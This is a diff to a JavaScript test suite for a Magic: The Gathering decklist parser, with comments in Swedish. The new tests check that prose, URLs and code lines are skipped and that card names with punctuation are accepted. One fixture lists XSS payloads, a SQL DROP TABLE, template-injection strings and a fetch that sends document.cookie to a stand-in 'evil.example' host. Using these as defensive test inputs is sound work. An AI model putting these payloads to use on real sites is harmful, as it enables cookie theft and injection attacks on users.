@@ -8,7 +8,7 @@ const src = fs.readFileSync(path.join(__dirname, '..', 'index.html'), 'utf8');
 const a = src.indexOf('const LEK_RUBRIKER = {'), b = src.indexOf('/* ══ BLOCK: DECKS');
 if (a < 0 || b < 0 || b < a) { console.error('hittar inte parsern i index.html'); process.exit(2); }
 const kod = src.slice(a, b);
-const { parseDecklist, parseList } = new Function('clamp', kod + '\nreturn { parseDecklist, parseList };')((v, lo, hi) => v < lo ? lo : v > hi ? hi : v);
+const { parseDecklist, parseList, lekKanVaraNamn } = new Function('clamp', kod + '\nreturn { parseDecklist, parseList, lekKanVaraNamn };')((v, lo, hi) => v < lo ? lo : v > hi ? hi : v);
 
 const ok = [], fel = [];
 const prov = (namn, f) => { try { f(); ok.push('OK   ' + namn); } catch (e) { fel.push('FEL  ' + namn + ' — ' + e.message); } };
@@ -105,6 +105,38 @@ prov('regressioner: "4 Mountain", "4x", "(LTC) 268", "· M21", parseList platt u
     ['Mountain', 'Mountain', 'Mountain', 'Mountain', 'Forest', 'Forest', 'Sol Ring', 'Opt']);
   assert.deepEqual(parseDecklist('  \n\n'), []);
   assert.deepEqual(parseDecklist('Nameless One\n1 Named Card').map(e => e.name), ['Nameless One', 'Named Card']);
+});
+
+prov('MES-175: prosa, adresser och kod hoppas över och räknas — de skickas aldrig till Scryfall', () => {
+  const l = parseDecklist(`Ta bort "Jumpstart Boosters Foundations" leken för Jesper`);
+  assert.deepEqual(l, []); assert.equal(l.hoppade, 1);
+  const k = parseDecklist(`<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+fetch('https://evil.example/steal?c=' + document.cookie);
+DROP TABLE decks;
+https://moxfield.com/decks/abc123
+www.example.com
+{{constructor.constructor('alert(1)')()}}
+\${7*7}
+kan du lägga till en lek med alla mina gröna kort från i går tack
+4 Lightning Bolt`);
+  assert.deepEqual(kort(k, false), ['4 Lightning Bolt']);
+  assert.equal(k.hoppade, 9);
+  assert.equal(parseDecklist('1 ' + 'A'.repeat(151)).hoppade, 1, 'för lång rad');
+  assert.equal(parseDecklist('4 1234 5678').hoppade, 1, 'inga bokstäver');
+});
+prov('MES-175: riktiga namn med skiljetecken går igenom — utan och med antal', () => {
+  for (const n of ['Circle of Protection: Artifacts', "Lim-Dûl's Vault", 'Jötun Grunt', 'Asmoranomardicadaistinaculdacar',
+    'Borrowing 100,000 Arrows', 'Fire // Ice', 'Ach! Hans, Run!', '_____ Goblin', "Look at Me, I'm R&D", 'B.F.M. (Big Furry Monster)',
+    'Who // What // When // Where // Why', 'Æther Vial'])
+    assert.ok(lekKanVaraNamn(n, false) && lekKanVaraNamn(n, true), n);
+  assert.ok(lekKanVaraNamn('Kongming, "Sleeping Dragon"', true), 'citattecken med antal');
+  assert.ok(!lekKanVaraNamn('Kongming, "Sleeping Dragon"', false), 'citattecken utan antal');
+  assert.ok(lekKanVaraNamn('The Ultimate Nightmare of Wizards of the Coast Customer Service', true), 'långt Un-namn med antal');
+  const l = parseDecklist('Lightning Bolt\nSol Ring\n1 Kongming, "Sleeping Dragon"');
+  assert.deepEqual(kort(l, false), ['1 Lightning Bolt', '1 Sol Ring', '1 Kongming, "Sleeping Dragon"']);
+  assert.equal(l.hoppade, 0);
+  assert.ok(!('medAntal' in l[0]), 'hjälpfältet läcker inte ut');
 });
 
 console.log([...ok, ...fel].join('\n'));
